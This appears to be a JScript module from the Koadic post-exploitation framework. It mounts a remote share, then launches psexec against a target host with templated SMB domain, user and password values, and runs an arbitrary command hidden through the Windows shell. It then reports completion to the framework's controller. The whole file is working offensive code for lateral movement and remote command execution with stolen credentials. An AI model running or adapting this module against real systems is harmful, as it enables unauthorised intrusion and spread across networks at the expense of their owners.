try
{
    var rpath = "~RPATH~"
    var UNC = "~RPATH~\\psexec.exe ";
    var domain = "~SMBDOMAIN~";
    var user = "~SMBUSER~";
    var pwd = "~SMBPASS~";
    var computer = "\\\\~RHOST~ ";

    UNC += computer;

    if (user != "" && pwd != "")
    {
        if (domain != "")
        {
            user = '"' + domain + "\\" + user + '"';
        }

        UNC += "-u " + user + " -p " + pwd + " ";
    }

    UNC += " -accepteula ~CMD~";

    // crappy hack to make sure it mounts

    var output = Koadic.shell.exec("net use * " + rpath, "~DIRECTORY~\\"+Koadic.uuid()+".txt");

    if (output.indexOf("Drive") != -1)
    {
        var drive = output.split(" ")[1];
        Koadic.shell.run("net use " + drive + " /delete", true);
    }
    Koadic.WS.Run("%comspec% /q /c " + UNC, 0, true);

    Koadic.work.report("Complete");
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
